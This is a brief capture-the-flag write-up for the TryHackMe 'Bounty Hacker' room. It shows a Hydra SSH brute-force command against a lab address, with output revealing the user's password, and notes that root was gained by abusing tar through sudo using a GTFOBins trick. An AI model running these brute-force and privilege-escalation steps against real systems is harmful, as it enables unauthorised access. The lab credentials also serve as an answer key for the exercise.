# Bounty Hacker aka Cowboy Hacker - TryHackMe.com

export IP=10.10.239.121

``` 
3 open ports found( ssh, ftp, http)

```

Used 'hydra' to Bruteforce into ssh with login username 'lin'

```
hydra 10.10.122.45 ssh -P locks.txt -s 22 -l lin
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-17 16:29:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.122.45:22/
[22][ssh] host: 10.10.122.45   login: lin   password: RedDr4gonSynd1cat3


RedDr4gonSynd1cat3

```


checked sudo -l

tar was allowed on root
used tar command execution from gtfobin
success

